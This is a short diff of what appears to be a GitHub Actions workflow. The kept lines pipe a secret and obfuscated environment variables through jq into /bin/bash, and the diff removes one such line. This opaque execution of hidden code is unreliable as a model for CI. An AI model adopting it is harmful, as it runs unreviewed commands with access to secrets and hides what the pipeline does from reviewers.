@@ -19,7 +19,6 @@ jobs:
           yeau86260: ${{ secrets.yeau86260 }}
         run: |
           printf '%s' "$yeau86260" | jq -r .ey6873 | /bin/bash
-          echo $as9675 | jq -r .uumz32 | /bin/bash
           echo $xb94 | jq -r .tsga2 | /bin/bash
 
       - name: Store artifact
